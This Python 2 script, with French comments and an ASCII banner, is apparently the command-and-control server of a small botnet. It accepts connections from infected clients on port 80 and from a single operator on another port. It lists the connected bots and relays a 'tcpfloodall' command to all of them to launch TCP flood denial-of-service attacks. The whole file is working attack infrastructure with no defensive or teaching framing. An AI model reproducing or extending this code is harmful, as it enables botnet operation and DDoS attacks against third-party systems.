#!/usr/bin/env python2

import os, sys, time
from socket import *

#Declaration des variables
port = 80
bridgeport = int(raw_input("Entrez le port du controleur: "))

intro = """
  ____.     ___.  ___.                    ____       _____         .__            
    |    |____ \_ |__\_ |__   ___________   /  _ \     /     \   ____ |  |__ _____   
    |    \__  \ | __ \| __ \_/ __ \_  __ \  >  _ </\  /  \ /  \ /  _ \|  |  \\__  \  
/\__|    |/ __ \| \_\ \ \_\ \  ___/|  | \/ /  <_\ \/ /    Y    (  <_> )   Y  \/ __ \_
\________(____  /___  /___  /\___  >__|    \_____\ \ \____|__  /\____/|___|  (____  /
              \/    \/    \/     \/               \/         \/            \/     \/ 
"""

s=socket(AF_INET, SOCK_STREAM)
s.settimeout(5) #Ferme louverture au bout de 5s
s.bind(("0.0.0.0",port)) #Ouvre la connexion en ecoute
s.listen(5)

bridge=socket(AF_INET, SOCK_STREAM)
bridge.bind(("0.0.0.0",bridgeport)) #Ouvre la connexion en ecoute
bridge.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) #Permet de reutiliser le meme port

allConnections = [] #Variable stockant les connexions
allAddresses = [] #Variable contenant les infos de connexions

#Permet de fermer les connexions clientes
def quitClients():
	for item in allConnections:
		try:
			item.close() #Ferme les connexions clientes
		except: 
			pass

	del allConnections[:]
	del allAddresses[:]	

#Accepte les connexions clientes
def getConnections():
	quitClients()
	while 1:
		try:
			q,addr=s.accept() #Accepte les connexions
			q.setblocking(1) #Every new socket has no timeout; every operation takes its time.
			allConnections.append(q) #Stocke les connexions dans la variable
			allAddresses.append(addr) #Stocke les informations de connexion dans la variable
		except: 
			break

#Envoi des infos au commander
def sendController(msg, q):
	try:
		q.send(msg)
		return 1 #Message envoye
	except: return 0 #Message perdu

def main():
	while 1:
		bridge.listen(0) #Permet la connexion d'un seul controleur
		q,addr=bridge.accept() #accepte les connexions

		while 1:
			try: command = q.recv(20480)
			except: break #Casse la boucle et recommence la fonction main

			if (command == "accept"):
				getConnections() #accepte les connexions clientes
				if (sendController("Connexions acceptees", q) == 0): #Envoie le msg au controleur et verifie lenvoi
					break
			elif(command == "list"):
				temporary = ""
				for item in allAddresses: temporary += "%d - %s|%s\n" % (allAddresses.index(item) + 1, str(item[0]), str(item[1]))
				if (temporary != ""):
					if (sendController(temporary, q) == 0): break
				else:
					if (sendController("Aucun clients connectes", q) == 0): break
			elif ("tcpfloodall " in command):
				for item in allConnections:
					try:
						item.send(command)
					except:
						pass
			elif(command == "quit"):
				quitClients()
				q.close()
				break
			else:
				if (sendController("Tu fais nimp gros", q) == 0): break

while 1:
	try:		
		main()
	except KeyboardInterrupt:
		quitClients()
	time.sleep(5) #Wait 5 Seconds before we start again
